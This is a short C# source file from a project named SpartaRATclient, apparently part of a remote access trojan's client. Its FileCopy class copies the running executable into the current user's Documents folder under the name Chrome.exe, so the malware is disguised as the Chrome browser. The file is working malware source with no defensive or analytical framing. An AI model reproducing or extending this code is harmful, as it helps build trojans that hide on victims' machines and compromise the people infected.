using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient
{
    public class FileCopy
    {
        //File copy
        private string CurrentPath;
        public FileCopy()
        {
            this.CurrentPath = Assembly.GetExecutingAssembly().Location;
        }
        public String This()
        {
            string NewPath = @"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe";
            if (!File.Exists(NewPath))
                File.Copy(this.CurrentPath, NewPath);
            else
                return "exist";
            return NewPath;
        }
    }
}
